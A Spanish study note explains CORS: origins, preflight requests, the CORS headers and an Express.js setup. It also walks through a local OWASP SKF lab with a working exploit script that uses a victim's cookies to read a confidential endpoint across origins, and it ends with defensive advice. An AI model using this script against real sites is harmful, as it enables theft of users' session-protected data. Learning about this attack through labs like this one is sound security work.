
## 🌐 ¿Qué es CORS?

**CORS** (Cross-Origin Resource Sharing) es un mecanismo de seguridad implementado en los navegadores para **restringir o permitir solicitudes HTTP entre distintos orígenes** (dominios, protocolos o puertos).

> 🔒 Su objetivo es proteger al usuario frente a solicitudes maliciosas que podrían comprometer sus datos.

---

## 🧭 ¿Qué es un origen (origin)?

Un **origen** está compuesto por:
- El **protocolo** (ej: `https`)
- El **dominio** (ej: `example.com`)
- El **puerto** (ej: `:443`)

Dos URLs tienen **diferente origen** si alguno de estos componentes es distinto.

📌 Ejemplo:
```

[https://example.com](https://example.com) ⬅️ origen A  
[https://api.example.com](https://api.example.com) ⬅️ origen B (subdominio diferente)  
[http://example.com](http://example.com) ⬅️ origen C (protocolo diferente)  
[https://example.com:8080](https://example.com:8080) ⬅️ origen D (puerto diferente)

````

---

## 🧪 ¿Cómo actúa CORS?

Cuando un sitio (origen A) quiere hacer una solicitud HTTP (fetch, XHR) a otro origen (origen B), el navegador:

1. Bloquea la solicitud por defecto.
2. Envía una **solicitud previa** (preflight request) `OPTIONS` si es necesario.
3. Espera una respuesta con los **encabezados CORS apropiados** desde el servidor de origen B.

### 🔖 Encabezados clave
- `Access-Control-Allow-Origin`: define qué origenes están permitidos
- `Access-Control-Allow-Methods`: métodos HTTP permitidos (GET, POST, PUT, etc)
- `Access-Control-Allow-Headers`: qué cabeceras se aceptan en la solicitud
- `Access-Control-Allow-Credentials`: permite el envío de cookies y autenticación

---

## 💡 Ejemplo práctico

```http
// Cliente hace una solicitud desde https://client.com
GET https://api.server.com/data

// El servidor responde con:
Access-Control-Allow-Origin: https://client.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Credentials: true
````

Si el servidor **no incluye estos headers**, el navegador **bloqueará la respuesta**, aunque la solicitud haya llegado al servidor.

---

## 🛠️ CORS en código (servidor)

### 🌍 Express.js (Node)

```js
const express = require('express');
const cors = require('cors');

const app = express();

app.use(cors({
  origin: 'https://client.com',
  methods: ['GET', 'POST'],
  credentials: true
}));
```



## 🧪 Ejemplo práctico: Explotación de CORS

### 🐳 Paso 1: Iniciar entorno vulnerable

Ejecutamos un contenedor Docker con una aplicación vulnerable a CORS:

```bash
docker pull blabla1337/owasp-skf-lab:cors
```

```bash
docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:cors
```

> ⚙️ Con `-p 127.0.0.1:5000:5000` estamos haciendo **port forwarding**, redirigiendo el puerto 5000 del contenedor al puerto 5000 de nuestra máquina local.

---

### 🐞 Paso 2: Script malicioso en HTML

Un atacante podría alojar el siguiente script en un sitio externo:

```html
<script>
    // Crear una solicitud a una API vulnerable
    var req = new XMLHttpRequest();

    req.onload = listener;
    req.open("GET", "http://localhost:5000/confidential", true);
    req.withCredentials = true;
    req.send();

    function listener() {
        // Mostrar la respuesta (datos robados) en el HTML
        document.getElementById("stoleninfo").innerHTML = this.responseText;
    }
</script>

<center>
    <h1>Has sido hackeado. Esto fue lo que te robé:</h1>
</center>

<p id="stoleninfo"></p>
```


Luego abrimos un servidor http con pyton por el puerto 8084 en donde este el `html`

```bash
python -m http.server 8084
```

---

### ⚠️ ¿Por qué es peligroso?

Este ataque funciona si el servidor `http://localhost:5000`:

- Permite solicitudes CORS desde cualquier origen (`Access-Control-Allow-Origin: *` o refleja el origen).
- Permite el uso de **cookies** o **tokens** con `Access-Control-Allow-Credentials: true`.

> En ese caso, el navegador del usuario envía automáticamente sus **cookies de sesión**, y la respuesta confidencial se muestra en el sitio del atacante.


---

### 🎯 Resultado

El atacante accede a información sensible y la inyecta en la página maliciosa:

```html
<p id="stoleninfo">[Datos privados obtenidos]</p>
```

---

## 🔐 Conclusión

> Siempre validar los orígenes y evitar reflejar cualquier `Origin` que venga del navegador.  
> Nunca usar `Access-Control-Allow-Origin: *` junto con `Access-Control-Allow-Credentials: true`.

---


---
## 🔐 Seguridad y buenas prácticas

- ❌ **No usar `Access-Control-Allow-Origin: *` si se usan cookies o tokens de sesión.**
    
- ✅ Siempre especificar los orígenes permitidos.
    
- ✅ Validar y sanitizar las cabeceras `Origin` en el backend.
    
- 🔍 Revisar posibles **exposiciones de datos sensibles** al habilitar CORS.
    
- 🔐 Considerar mecanismos de autenticación robustos en APIs públicas.
    

---

## 🧷 Tags

#ciberseguridad #web #CORS #seguridad_web #http_headers

[[OWASP]]